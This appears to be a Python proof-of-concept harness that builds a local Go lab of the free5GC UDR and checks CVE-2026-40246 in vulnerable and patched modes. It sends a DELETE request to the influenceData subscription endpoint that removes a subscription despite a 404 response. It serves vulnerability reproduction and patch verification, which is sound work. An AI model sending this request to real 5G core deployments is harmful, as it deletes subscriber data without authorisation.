#!/usr/bin/env python3
"""Dynamic before/after demo for CVE-2026-40246 (free5GC UDR), mirroring
ssrf_lab's vulnerable-mode / patched-mode pattern: start udr_lab.go,
attack it with an influenceId that is NOT "subs-to-notify", and check
whether the subscription actually got deleted - which the real bug does
regardless of the misleading 404 the API returns either way.

Run: python run_demo.py
Needs: a Go toolchain on PATH (go run).
"""
import subprocess
import sys
import time
from pathlib import Path

import requests

HERE = Path(__file__).parent
PORT = 8090
BASE = f"http://127.0.0.1:{PORT}"
VICTIM_ID = "sub-002"  # a real, seeded subscription - not "subs-to-notify"


def _binary_path() -> Path:
    import platform
    return HERE / ("udr_lab.exe" if platform.system() == "Windows" else "udr_lab")


def build_lab() -> Path:
    """Build once, run the compiled binary directly for every mode. `go run`
    spawns the compiled server as a CHILD of the `go run` wrapper process -
    Popen.terminate() on the wrapper doesn't reliably kill that child on
    Windows (no process-group signal propagation), which left a stale
    vulnerable-mode server bound to :8090 across the two attack_and_report()
    calls and produced a false "patched" verdict against a process that was
    never actually running in patched mode. Building once and running the
    binary directly means Popen.terminate() kills the actual server."""
    binary = _binary_path()
    subprocess.run(["go", "build", "-o", str(binary), "udr_lab.go"],
                    cwd=str(HERE), check=True)
    return binary


def start_lab(binary: Path, mode: str) -> subprocess.Popen:
    import os
    env = {**os.environ, "LAB_MODE": mode, "LAB_PORT": str(PORT)}
    proc = subprocess.Popen(
        [str(binary)], cwd=str(HERE), env=env,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        try:
            if requests.get(f"{BASE}/health", timeout=1).status_code == 200:
                return proc
        except requests.RequestException:
            pass
        time.sleep(0.3)
    proc.terminate()
    raise RuntimeError("lab never became healthy")


def subscription_exists(sub_id: str) -> bool:
    r = requests.get(f"{BASE}/subscriptions", timeout=5)
    return sub_id in r.json().get("subscriptions", [])


def attack_and_report(binary: Path, mode: str) -> None:
    print(f"\n=== mode={mode} ===")
    proc = start_lab(binary, mode)
    try:
        before = subscription_exists(VICTIM_ID)
        print(f"  {VICTIM_ID} exists before attack: {before}")

        # The exploit: DELETE with an influenceId that is NOT "subs-to-notify".
        r = requests.delete(
            f"{BASE}/nudr-dr/v2/subscription-data/influenceData/{VICTIM_ID}",
            timeout=5,
        )
        print(f"  DELETE /.../{VICTIM_ID} -> HTTP {r.status_code}")

        after = subscription_exists(VICTIM_ID)
        print(f"  {VICTIM_ID} exists after attack:  {after}")

        deleted_anyway = before and not after
        if mode == "vulnerable":
            verdict = "EXPLOITED" if (r.status_code == 404 and deleted_anyway) else "NOT REPRODUCED"
        else:
            verdict = "BLOCKED" if not deleted_anyway else "PATCH FAILED"
        print(f"  VERDICT: {verdict}"
              f"{' (404 returned but subscription deleted anyway)' if deleted_anyway and r.status_code == 404 else ''}")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    print("CVE-2026-40246 / GHSA-g9cw-qwhf-24jp — free5GC UDR improper path validation")
    print("Reproducing: DeleteInfluenceSubscription is missing a `return` after its")
    print("404-on-mismatch response, so the subscription is deleted regardless.\n")
    binary = build_lab()
    try:
        attack_and_report(binary, "vulnerable")
        attack_and_report(binary, "patched")
    finally:
        binary.unlink(missing_ok=True)
